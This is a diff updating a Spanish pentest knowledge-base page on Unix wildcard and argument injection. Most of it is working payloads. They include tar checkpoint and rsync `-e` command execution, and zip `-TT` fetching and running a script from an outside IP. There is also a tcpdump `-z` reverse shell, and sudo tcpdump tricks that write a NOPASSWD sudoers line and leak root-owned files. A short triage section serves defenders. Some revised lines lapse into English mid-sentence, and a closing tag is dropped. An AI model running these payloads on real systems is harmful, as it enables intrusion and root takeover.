@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> La **inyección de argumentos** mediante Wildcard (también llamado *glob*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin comillas como `*`.
+> La **argument injection** con Wildcards (también llamados *globs*) ocurre cuando un script privilegiado ejecuta un binario de Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard sin comillas como `*`.
 > Como el shell expande el wildcard **antes** de ejecutar el binario, un atacante que pueda crear archivos en el directorio de trabajo puede crear nombres de archivo que comiencen por `-`, haciendo que se interpreten como **opciones en lugar de datos** y permitiendo introducir flags arbitrarios o incluso comandos.
 > Esta página recopila las primitivas más útiles, investigaciones recientes y detecciones modernas para 2023-2025.
 
@@ -13,15 +13,15 @@ Puedes **copiar el propietario/grupo o los bits de permisos de un archivo arbitr
 # attacker-controlled directory
 touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-Cuando root ejecute más tarde algo como:
+Cuando root ejecuta posteriormente algo como:
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-Se inyecta `--reference=/root/secret``file`, lo que provoca que *todos* los archivos coincidentes hereden la propiedad y los permisos de `/root/secret``file`.
+`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.
 
-*PoC y herramienta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).  
-Consulta también el artículo clásico de DefenseCode para obtener más detalles.
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
+Consulta también el clásico paper de DefenseCode para más detalles.<sup>[[6]](#references)</sup>
 
 ---
 
@@ -29,7 +29,7 @@ Consulta también el artículo clásico de DefenseCode para obtener más detalle
 
 ### GNU tar (Linux, *BSD, busybox-full)
 
-Ejecuta comandos arbitrarios abusando de la funcionalidad **checkpoint**:
+Ejecuta comandos arbitrarios abusando de la funcionalidad de **checkpoint**:
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
@@ -41,23 +41,23 @@ Una vez que root ejecuta, por ejemplo, `tar -czf /root/backup.tgz *`, `shell.sh`
 
 ### bsdtar / macOS 14+
 
-El `tar` predeterminado en las versiones recientes de macOS (basado en `libarchive`) no implementa `--checkpoint`, pero aún puedes lograr code-execution con el flag **--use-compress-program**, que permite especificar un compresor externo.
+El `tar` predeterminado en versiones recientes de macOS (basado en `libarchive`) no implementa `--checkpoint`, pero aún puedes lograr code-execution con el flag **--use-compress-program**, que permite especificar un compresor externo.
 ```bash
 # macOS example
 touch "--use-compress-program=/bin/sh"
 ```
-Cuando un script privilegiado ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.
+Cuando un script con privilegios ejecuta `tar -cf backup.tar *`, se iniciará `/bin/sh`.
 
 ---
 
 ## rsync
 
-`rsync` permite sobrescribir el shell remoto o incluso el binario remoto mediante flags de línea de comandos que comienzan con `-e` o `--rsync-path`:
+`rsync` permite sobrescribir el remote shell o incluso el remote binary mediante flags de línea de comandos que comienzan por `-e` o `--rsync-path`:
 ```bash
 # attacker-controlled directory
 touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-Si root archiva posteriormente el directorio con `rsync -az * backup:/srv/`, el flag inyectado genera tu shell en el lado remoto.
+Si root archiva posteriormente el directorio con `rsync -az * backup:/srv/`, el flag inyectado ejecuta tu shell en el lado remoto.
 
 *PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (modo `rsync`).
 
@@ -84,9 +84,9 @@ Esto sobrevive a `-- *` porque la CLI de 7-Zip acepta explícitamente tanto nomb
 
 ## zip
 
-Existen dos primitives muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).
+Existen dos primitives muy prácticas cuando una aplicación pasa nombres de archivo controlados por el usuario a `zip` (ya sea mediante un wildcard o enumerando nombres sin `--`).<sup>[[2]](#references)[[3]](#references)</sup>
 
-- RCE via test hook: `-T` activa “test archive” y `-TT <cmd>` reemplaza el tester por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que comiencen por `-`, divide los flags entre distintos nombres de archivo para que funcione el parsing de short-options:
+- RCE mediante un test hook: `-T` habilita “test archive” y `-TT <cmd>` reemplaza el tester por un programa arbitrario (forma larga: `--unzip-command <cmd>`). Si puedes inyectar nombres de archivo que empiecen por `-`, divide los flags entre distintos nombres de archivo para que funcione el parsing de short-options:
 ```bash
 # Attacker-controlled filenames (e.g., in an upload directory)
 # 1) A file literally named: -T
@@ -97,19 +97,19 @@ Existen dos primitives muy prácticas cuando una aplicación pasa nombres de arc
 ```
 Notas
 - NO intentes usar un único nombre de archivo como `'-T -TT <cmd>'` — las opciones cortas se analizan carácter por carácter y fallará. Usa tokens separados como se muestra.
-- Si la aplicación elimina las barras diagonales de los nombres de archivo, realiza la descarga desde un host/IP sin ruta (ruta predeterminada `/index.html`) y guárdalo localmente con `-O`; después, ejecútalo.
-- Puedes depurar el análisis con `-sc` (muestra el argv procesado) o `-h2` (más ayuda) para comprender cómo se consumen tus tokens.
+- Si la aplicación elimina las barras diagonales de los nombres de archivo, realiza la descarga desde un host/IP sin ruta (la ruta predeterminada es `/index.html`) y guárdala localmente con `-O`; después, ejecútala.
+- Puedes depurar el análisis con `-sc` (muestra los argumentos procesados) o `-h2` (más ayuda) para entender cómo se consumen tus tokens.
 
 Ejemplo (comportamiento local en zip 3.0):
 ```bash
 zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
 zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
 ```
-- Data exfil/leak: Si la capa web muestra la salida estándar/de error de `zip` (algo común con wrappers ingenuos), los flags inyectados como `--help` o los errores de opciones incorrectas aparecerán en la respuesta HTTP, confirmando la command-line injection y ayudando a ajustar el payload.
+- Exfiltración de datos/leak: Si la capa web devuelve la salida stdout/stderr de `zip` (algo común con wrappers ingenuos), flags inyectados como `--help` o los errores provocados por opciones incorrectas aparecerán en la respuesta HTTP, confirmando la inyección de línea de comandos y ayudando a ajustar el payload.
 
 ---
 
-## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)
+## Binaries adicionales vulnerables a wildcard injection (lista rápida de 2023-2025)
 
 Los siguientes comandos han sido abusados en CTFs modernos y entornos reales. El payload siempre se crea como un *filename* dentro de un directorio con permisos de escritura que posteriormente se procesará con un wildcard:
 
@@ -120,19 +120,19 @@ Los siguientes comandos han sido abusados en CTFs modernos y entornos reales. El
 | `git`   | `-c core.sshCommand=<cmd>` | Ejecución de comandos mediante git over SSH |
 | `scp`   | `-S <cmd>` | Iniciar un programa arbitrario en lugar de ssh |
 
-Estas primitives son menos comunes que los clásicos de *tar/rsync/zip*, pero vale la pena comprobarlas durante la búsqueda.
+Estas primitivas son menos comunes que las clásicas de *tar/rsync/zip*, pero vale la pena comprobarlas durante la búsqueda.
 
 ---
 
-## Hunting vulnerable wrappers and jobs
+## Búsqueda de wrappers y jobs vulnerables
 
-Casos recientes han demostrado que la wildcard/argv injection ya no es únicamente un problema de **cron + tar**. La misma clase de bug sigue apareciendo en:
+Casos recientes han demostrado que wildcard/argv injection ya no es solamente un problema de **cron + tar**.<sup>[[5]](#references)</sup> La misma clase de bug sigue apareciendo en:
 
-- funcionalidades web que "download everything as zip/tar" desde directorios de uploads controlados por el atacante
+- funcionalidades web que "descargan todo como zip/tar" desde directorios de uploads controlados por el atacante
 - debug shells de vendors/appliances que exponen un wrapper de **tcpdump** con campos de filename/filter controlados por el atacante
-- jobs de backup o rotation que ejecutan `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` en directorios con permisos de escritura
+- jobs de backup o rotación que ejecutan `tar`, `rsync`, `7z`, `zip`, `chown` o `chmod` en directorios con permisos de escritura
 
-Comandos útiles de triage:
+Comandos útiles para el triage:
 ```bash
 # Hunt for interesting binaries fed with globs or positional user data
 rg -n --hidden --follow \
@@ -148,22 +148,22 @@ rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
 ```
 Heurísticas rápidas:
 
-- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za` porque `@listfiles` se analiza por separado.
-- Para `zip`, busca wrappers que enumeren directamente nombres de archivo controlados por el usuario; la división de opciones cortas (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un shell glob.
-- Para `tcpdump`, presta especial atención a los wrappers que permiten controlar **nombres de archivos de salida**, **configuraciones de rotación** o argumentos de **reproducción de archivos de captura**.
+- `-- *` es una buena solución para muchas herramientas GNU, pero **no** para `7z`/`7za` porque `@listfiles` se analizan por separado.
+- Para `zip`, busca wrappers que enumeren directamente filenames controlados por el usuario; la división de short-options (`-T` + `-TT <cmd>`) sigue funcionando incluso sin un shell glob.
+- Para `tcpdump`, presta especial atención a los wrappers que permiten controlar **output file names**, **rotation settings** o los argumentos de **capture-file replay**.
 
 ---
 
-## tcpdump rotation hooks (-G/-W/-z): RCE mediante inyección de argv en wrappers
+## tcpdump rotation hooks (-G/-W/-z): RCE mediante argv injection en wrappers
 
-Cuando un restricted shell o un wrapper de un proveedor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (por ejemplo, un parámetro de "file name") sin un quoting/validación estrictos, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limita el número de archivos) y `-z <cmd>` (comando posterior a la rotación) permite la ejecución arbitraria de comandos como el usuario que ejecuta tcpdump (a menudo root en appliances).
+Cuando un restricted shell o un wrapper de un proveedor construye una línea de comandos de `tcpdump` concatenando campos controlados por el usuario (por ejemplo, un parámetro de "file name") sin aplicar un quoting/validación estrictos, puedes introducir flags adicionales de `tcpdump`. La combinación de `-G` (rotación basada en tiempo), `-W` (limitar el número de archivos) y `-z <cmd>` (comando posterior a la rotación) permite ejecutar comandos arbitrarios como el usuario que ejecuta tcpdump (a menudo root en appliances).<sup>[[1]](#references)[[4]](#references)</sup>
 
-Requisitos previos:
+Prerequisites:
 
 - Puedes influir en el `argv` pasado a `tcpdump` (por ejemplo, mediante un wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
-- El wrapper no sanea los espacios ni los tokens que comienzan por `-` en el campo del nombre de archivo.
+- El wrapper no sanitiza los espacios ni los tokens que empiezan por `-` en el campo de file name.
 
-PoC clásico (ejecuta un script de reverse shell desde una ruta con permisos de escritura):
+PoC clásica (ejecuta un reverse shell script desde un path con permisos de escritura):
 ```sh
 # Reverse shell payload saved on the device (e.g., USB, tmpfs)
 cat > /mnt/disk1_1/rce.sh <<'EOF'
@@ -184,23 +184,23 @@ printf x | nc -u -6 [victim_ipv6] 1234
 Detalles:
 
 - `-G 1 -W 1` fuerza una rotación inmediata después del primer paquete coincidente.
-- `-z <cmd>` ejecuta el comando posterior a la rotación una vez por cada rotación. Muchas compilaciones ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/intérprete, asegúrate de que el manejo de argumentos coincida con tu payload.
+- `-z <cmd>` ejecuta el comando posterior a la rotación una vez por rotación. Muchas builds ejecutan `<cmd> <savefile>`. Si `<cmd>` es un script/interpreter, asegúrate de que el manejo de argumentos coincida con tu payload.
 
 Variantes sin medios extraíbles:
 
-- Si tienes cualquier otra primitive para escribir archivos (por ejemplo, un wrapper de comandos independiente que permita la redirección de salida), coloca tu script en una ruta conocida y ejecuta `-z /bin/sh /path/script.sh` o `-z /path/script.sh`, según la semántica de la plataforma.
-- Algunos wrappers de proveedores rotan hacia ubicaciones controlables por el atacante. Si puedes influir en la ruta rotada (symlink/traversal de directorios), puedes dirigir `-z` para ejecutar contenido que controles completamente sin medios externos.
+- Si tienes cualquier otra primitive para escribir archivos (por ejemplo, un command wrapper independiente que permita la redirección de salida), coloca tu script en una ruta conocida y ejecuta `-z /bin/sh /path/script.sh` o `-z /path/script.sh`, según la semántica de la plataforma.
+- Algunos vendor wrappers rotan hacia ubicaciones controlables por el atacante. Si puedes influir en la ruta rotada (symlink/directory traversal), puedes dirigir `-z` para que ejecute contenido que controles completamente sin medios externos.
 
 ---
 
-## sudoers: tcpdump con wildcards/argumentos adicionales → escritura/lectura arbitraria y root
+## sudoers: tcpdump con wildcards/args adicionales → arbitrary write/read y root
 
-Anti-pattern muy común en sudoers:
+Anti-pattern muy común en sudoers:<sup>[[3]](#references)</sup>
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
 ```
 Problemas
-- El glob `*` y los patrones permisivos solo limitan el primer argumento `-w`. `tcpdump` acepta varias opciones `-w`; prevalece la última.
+- El glob `*` y los patrones permisivos solo restringen el primer argumento de `-w`. `tcpdump` acepta varias opciones `-w`; prevalece la última.
 - La regla no fija otras opciones, por lo que se permiten `-Z`, `-r`, `-V`, etc.
 
 Primitivas
@@ -216,16 +216,16 @@ sudo tcpdump -c10 \
 -w/var/cache/captures/a/../../../../dev/shm/out \
 -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Fuerza la propiedad de la salida con `-Z root` (crea archivos propiedad de root en cualquier lugar):
+- Fuerza la propiedad de los archivos de salida con `-Z root` (crea archivos propiedad de root en cualquier ubicación):
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -w /dev/shm/root-owned \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Escritura de contenido arbitrario mediante la reproducción de un PCAP diseñado con `-r` (por ejemplo, para añadir una línea a sudoers):
+- Escritura de contenido arbitrario reproduciendo un PCAP preparado mediante `-r` (por ejemplo, para añadir una línea a sudoers):
 
 <details>
-<summary>Crea un PCAP que contenga el payload ASCII exacto y escríbelo como root</summary>
+<summary>Crear un PCAP que contenga el payload ASCII exacto y escribirlo como root</summary>
 ```bash
 # On attacker box: craft a UDP packet stream that carries the target line
 printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
@@ -237,9 +237,7 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-</details>
-
-- Lectura arbitraria de archivos/secret leak con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error suelen mostrar las líneas, filtrando su contenido:
+- Lectura arbitraria de archivos/leak de secretos con `-V <file>` (interpreta una lista de savefiles). Los diagnósticos de error suelen repetir las líneas, filtrando el contenido:
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 -w /tmp/dummy \
@@ -249,10 +247,11 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 
 ## Referencias
 
-- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
-- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
-- [0xdf - HTB Dump: Inyección de argumentos de zip a RCE + privesc por una configuración incorrecta de sudo en tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
-- [FiberGateway GR241AG - Cadena de exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
-- [Elastic - Shell potencial mediante inyección de comodines detectada](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
+- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
+- [3] [0xdf - HTB Dump: Inyección de argumentos de zip a RCE + privesc mediante una configuración incorrecta de sudo en tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
+- [4] [FiberGateway GR241AG - Cadena de exploit completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+- [5] [Elastic - Potencial Shell detectado mediante inyección de comodines](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
+- [6] [Regreso al futuro: los comodines de Unix descontrolados (DefenseCode)](https://www.exploit-db.com/papers/33930)
 
 {{#include ../../banners/hacktricks-training.md}}
